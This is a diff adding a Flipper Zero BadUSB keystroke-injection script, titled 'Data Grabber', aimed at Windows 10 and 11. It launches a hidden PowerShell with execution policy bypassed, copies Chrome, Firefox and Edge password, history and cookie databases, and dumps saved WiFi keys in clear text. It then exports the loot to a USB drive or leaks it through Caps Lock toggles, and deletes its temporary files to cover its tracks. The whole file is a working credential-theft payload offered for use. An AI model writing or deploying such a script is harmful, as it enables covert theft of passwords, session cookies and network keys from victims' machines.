@@ -1,0 +1,88 @@
+REM Title: Data Grabber - Browser & WiFi Credentials
+REM Description: Extracts browser history, cookies, passwords & WiFi credentials
+REM Target: Windows 10, 11
+REM Compatible: Flipper Zero BadUSB
+
+REM ===== DEFINE CONFIGURATION =====
+REM EXPORT_MODE: Choose your export method
+REM   1 = USB mass storage FIRST, fallback to Caps Lock encoding if USB not found
+REM   2 = USB mass storage ONLY (no fallback)
+REM   3 = Caps Lock binary encoding ONLY (no USB attempt)
+REM
+REM CAPS_LOCK_DELAY_MS: Milliseconds between Caps Lock toggles
+REM   Default: 50ms (adjust if too fast or slow for target)
+REM ===== END DEFINES =====
+
+DEFINE EXPORT_MODE 1
+DEFINE CAPS_LOCK_DELAY_MS 50
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass
+ENTER
+DELAY 1000
+
+REM Extract Chrome Data
+DELAY 500
+STRING $chromePath = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default"; if(Test-Path $chromePath) { Copy-Item "$chromePath\Login Data" "$Env:TEMP\chrome_passwords.db" -ErrorAction SilentlyContinue; Copy-Item "$chromePath\History" "$Env:TEMP\chrome_history.db" -ErrorAction SilentlyContinue; Copy-Item "$chromePath\Cookies" "$Env:TEMP\chrome_cookies.db" -ErrorAction SilentlyContinue; Write-Host "Chrome data extracted" }
+ENTER
+DELAY 500
+
+REM Extract Firefox Data
+STRING $firefoxPath = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles"; if(Test-Path $firefoxPath) { Get-ChildItem $firefoxPath -Filter "*.db" | ForEach-Object { Copy-Item $_.FullName "$Env:TEMP\firefox_$($_.Name)" -ErrorAction SilentlyContinue } }
+ENTER
+DELAY 500
+
+REM Extract Edge Data
+STRING $edgePath = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default"; if(Test-Path $edgePath) { Copy-Item "$edgePath\Login Data" "$Env:TEMP\edge_passwords.db" -ErrorAction SilentlyContinue; Copy-Item "$edgePath\History" "$Env:TEMP\edge_history.db" -ErrorAction SilentlyContinue }
+ENTER
+DELAY 500
+
+REM Extract WiFi Passwords
+STRING $wifiPasswords = @(); netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $ssid = $_.Line -replace '.*:\s+' -replace '\s+$'; $key = netsh wlan show profile name="$ssid" key=clear | Select-String "Key Content"; $wifiPasswords += "$ssid : $key" }; $wifiPasswords | Out-File "$Env:TEMP\wifi_passwords.txt"
+ENTER
+DELAY 1000
+
+REM Compile all data into single file for encoding
+STRING $allData = @(); Get-ChildItem "$Env:TEMP\*passwords*.db" -ErrorAction SilentlyContinue | ForEach-Object { $allData += "=== $($_.Name) ===" + [System.IO.File]::ReadAllText($_.FullName) }; Get-ChildItem "$Env:TEMP\*history*.db" -ErrorAction SilentlyContinue | ForEach-Object { $allData += "=== $($_.Name) ===" + [System.IO.File]::ReadAllText($_.FullName) }; Get-Content "$Env:TEMP\wifi_passwords.txt" -ErrorAction SilentlyContinue | ForEach-Object { $allData += "=== WiFi Passwords ===" + $_ }
+ENTER
+DELAY 500
+
+REM ===== MODE 1: USB FIRST, then Caps Lock fallback =====
+STRING $found = $false; foreach($drive in @('E','F','G','H','I','J','K','L')) { if(Test-Path "$($drive):\") { Copy-Item "$Env:TEMP\*passwords*.db" "$($drive):\" -ErrorAction SilentlyContinue; Copy-Item "$Env:TEMP\*history*.db" "$($drive):\" -ErrorAction SilentlyContinue; Copy-Item "$Env:TEMP\wifi_passwords.txt" "$($drive):\" -ErrorAction SilentlyContinue; Write-Host "SUCCESS: Data exported to $($drive):"; $found = $true; break } }
+ENTER
+DELAY 1000
+
+REM If USB found, cleanup and exit
+STRING if($found) { Remove-Item "$Env:TEMP\*passwords*.db" -Force -ErrorAction SilentlyContinue; Remove-Item "$Env:TEMP\*history*.db" -Force -ErrorAction SilentlyContinue; Remove-Item "$Env:TEMP\wifi_passwords.txt" -Force -ErrorAction SilentlyContinue; Write-Host 'Data ready on Flipper'; exit }
+ENTER
+DELAY 500
+
+REM ===== FALLBACK: If USB not found, use Caps Lock encoding =====
+STRING Write-Host 'USB not found. Encoding via Caps Lock...'; [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
+ENTER
+DELAY 500
+
+STRING $wifiData = Get-Content "$Env:TEMP\wifi_passwords.txt" -Raw -ErrorAction SilentlyContinue; $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($wifiData))
+ENTER
+DELAY 500
+
+STRING $binary = -join @($encoded.ToCharArray() | ForEach-Object { [Convert]::ToString([byte]$_, 2).PadLeft(8,'0') })
+ENTER
+DELAY 500
+
+STRING foreach($bit in $binary.ToCharArray()) { if($bit -eq '1') { [System.Windows.Forms.SendKeys]::SendWait('+{CAPSLOCK}') }; [System.Windows.Forms.SendKeys]::SendWait(' '); Start-Sleep -Milliseconds 50 }
+ENTER
+DELAY 500
+
+STRING Write-Host 'SUCCESS: WiFi data encoded via Caps Lock (1=toggle, 0=space)'
+ENTER
+DELAY 1000
+
+REM Cleanup
+STRING Remove-Item "$Env:TEMP\*passwords*.db" -Force -ErrorAction SilentlyContinue; Remove-Item "$Env:TEMP\*history*.db" -Force -ErrorAction SilentlyContinue; Remove-Item "$Env:TEMP\wifi_passwords.txt" -Force -ErrorAction SilentlyContinue
+ENTER
+DELAY 500
+
+STRING exit
+ENTER
